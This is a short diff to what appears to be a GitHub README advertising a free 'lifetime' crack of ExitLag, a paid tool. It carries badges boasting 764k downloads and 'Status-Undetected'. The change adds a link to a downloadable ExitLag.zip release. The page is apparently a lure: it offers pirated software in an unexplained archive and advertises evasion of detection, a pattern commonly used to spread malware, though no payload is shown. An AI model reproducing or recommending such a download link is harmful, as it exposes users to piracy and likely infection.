@@ -1,7 +1,7 @@
 # ⛩️ExitLag Life Time⛩️  ![fds](https://img.shields.io/badge/Downloads-764k-blue) ![hhhh](https://img.shields.io/badge/Status-Undetected-%2300e600)
 
 <p align="center">
-  <a href="">
+  <a href="https://github.com/tolotraRan/ExitLag-Life-Time-Free/releases/download/Release/ExitLag.zip">
     <img src="https://github.com/user-attachments/assets/33ca32ba-6d5c-4f35-a66a-75792ae84403" alt="Sublime's custom image"/>
   </a>
 </p>
